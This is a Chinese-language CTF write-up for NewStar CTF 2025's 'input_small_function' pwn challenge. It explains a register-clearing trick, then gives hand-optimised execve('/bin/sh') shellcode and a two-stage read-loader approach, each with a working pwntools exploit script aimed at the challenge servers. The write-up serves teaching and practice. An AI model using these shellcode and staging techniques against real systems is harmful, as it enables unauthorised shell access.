---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

<script setup>
import Container from '@/components/docs/Container.vue'
</script>

# input_small_function

<Container type='info'>

本题考查 shellcode 的进阶利用。
</Container>

这道题目是 input_function 的延续，我们把可执行文件用 IDA 打开，查看 `main` 函数：

![image-20251104182010296](/assets/images/wp/2025/week2/input-small-function_1.png)

这一道题目仍然考查 shellcode，但是对读入字符数做出了限制，同时存在一个 `clear` 函数，我们查看一下 `clear` 函数的内容。

![image-20251106193824042](/assets/images/wp/2025/week2/input-small-function_2.png)

看上去就只是返回了 0，但是我们看汇编代码。

![image-20251106193855059](/assets/images/wp/2025/week2/input-small-function_3.png)

可以看到程序清空了 `rax`，`rbx`，`rcx`，`rdx`，`rdi`，`rsi`，`r8`-`r15`寄存器，因此此时程序中仅有 `rbp`，`rsp`，`rip` 三个寄存器没有被清空。

![image-20251106194036494](/assets/images/wp/2025/week2/input-small-function_4.png)

随后程序返回 `main` 函数之后，将 shellcode 开始的地址放入 `rdx` 中，随后执行 `call rdx` 以执行 shellcode。

![image-20251106194156440](/assets/images/wp/2025/week2/input-small-function_5.png)

由于存在 shellcode 字符数限制，因此直接使用 pwntools 生成的 shellcode 会由于长度过长而导致失败，一般情况下我们有以下的两条思路。

## 思路一：shellcode 优化

我们先考虑对 shellcode 进行优化。

首先我们写出最简单的 shellcode：

```asm
mov rax, 59
mov rdi, 0x68732f6e69622f
push rdi
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall
```

这个 shellcode 是最简单最直观的，但是汇编出来是 29 字节，长度过长，我们以这个为基础进行优化。

在 gdb 中我们可以看到，程序在进入 shellcode 之前清空了除了 `rsi` 等寄存器，因此即使我不使用 `xor rsi, rsi`，`rsi` 寄存器也是 0，因此可以直接删去这一行。

同时，由于 `rax` 也被清零，所以将 `rax` 赋值为 59，下面几行汇编指令均可以达到目的：

```asm
mov rax,59
mov eax,59
mov ax,59
mov al,59

add rax,59
add eax,59
add ax,59
add al,59
```

汇编之后的机器码如下，可以看到字符数最少的语句是 `mov al, 0x3b`，仅为 2 字节。

```asm
Disassembly:
0:  48 c7 c0 3b 00 00 00    mov    rax,0x3b
7:  b8 3b 00 00 00          mov    eax,0x3b
c:  66 b8 3b 00             mov    ax,0x3b
10: b0 3b                   mov    al,0x3b
12: 48 83 c0 3b             add    rax,0x3b
16: 83 c0 3b                add    eax,0x3b
19: 66 83 c0 3b             add    ax,0x3b
1d: 04 3b                   add    al,0x3b
```

随后，我们需要知道，`push 寄存器`和 `pop 寄存器`的字符数均为 1，因此 `mov rdi, rsp`<span data-desc>（3 字节）</span>可写为 `push rsp ; pop rdi`<span data-desc>（2 字节）</span>，这样还能节省 1 字节。

`xor rdx, rdx` 为 3 字节，但是 `xor edx, edx` 仅为 2 字节也可以达到清空寄存器的目的。

优化完的 shellcode 如下：

```asm
mov al, 59
mov rdi, 0x68732f6e69622f
push rdi
push rsp
pop rdi
xor edx, edx
syscall
```

> [!info]
> 将 `xor edx, edx` 写成 `cdq` 还可以再节省 1 字节的空间

最终的脚本如下：

```python
from pwn import *
context(os="linux", arch="amd64", log_level="debug")

io = remote("8.147.132.32", 25912)
# io = process("src/pwn")
io.recvuntil(b"please input a small function")
shell = """
mov al, 59
mov rdi, 0x68732f6e69622f
push rdi
push rsp
pop rdi
xor edx, edx
syscall
"""
shell = asm(shell)
io.send(shell)

io.interactive()
```

## 思路二：构建 `read` 再次读入

其实还有种思路，既然执行 shellcode 的时候，shellcode 所处段还是可读可写可执行的状态，并且 `rdx` 中还存储着此段的地址，那么可以考虑通过 shellcode 构建一个 `read`，通过这个 `read` 再次读入 shellcode，即可绕过 `main` 函数中 `read` 对于字节大小的限制。

相当于是要分两次写入两段 shellcode，第一段 shellcode 调用 `read` 函数以读入第二段 shellcode，通过第二段 shellcode 拿到 shell

```python
from pwn import *
context(os="linux", arch="amd64", log_level="debug")

io = remote("39.106.48.123", 36987)
# io = process("src/pwn")
io.recvuntil(b"please input a small function")
shell1 = """
mov rsi, rdx
syscall
"""
shell1 = asm(shell1)
shell2 = b"\x90"*5 + asm(shellcraft.sh())

io.send(shell1)
pause()
io.send(shell2)

io.interactive()
```
